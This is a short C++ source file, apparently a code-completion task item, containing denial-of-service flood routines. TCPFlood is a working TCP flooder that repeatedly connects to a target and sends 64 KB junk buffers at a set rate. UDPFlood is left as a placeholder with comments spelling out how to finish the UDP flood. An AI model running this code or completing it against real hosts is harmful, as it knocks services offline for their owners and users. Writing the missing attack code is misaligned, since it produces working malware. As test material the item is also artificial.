#include "Flood.h"
#include "Sockets.h"

void TCPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
	sockaddr_in input;
	if (!GetSocketAddress(destination, &input)) return;
	input.sin_port = htons(port);
	SOCKET s;

	char data[65536];
	memset(data, 0xCC, 65536);

	for (int i = 0; i < seconds * timespersecond; i++) {
		Sleep(1000 / timespersecond);
		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s == 0) continue;
		
		int cRes = connect(s, (sockaddr*)&input, sizeof(input));
		if (cRes == SOCKET_ERROR) {
			closesocket(s); continue;
		}
		send(s, data, 65536, 0);
		Sleep(10);
		send(s, data, 65536, 0);

		closesocket(s);
	}
}

void UDPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
	sockaddr_in input;
	if (!GetSocketAddress(destination, &input)) return;
	input.sin_port = htons(port);
	SOCKET c; 

	char dat[65536];
	memset(dat, 0xCC, 65536);

    // 	Use the GetSocketAddress function to obtain the address information of the target host and convert the port to network byte order. Use a loop to control the duration of the attack and send a specified number of UDP packets per second. Wait for a period of time in each loop to control the number of attacks sent per second.
    // Create a UDP socket and connect to the target host and port through the connect function.
    // Send two UDP packets with a size of 65536 bytes, with a 10 millisecond interval between each packet.
    // Close the socket and continue with the next loop.
    <FILL_HERE>
}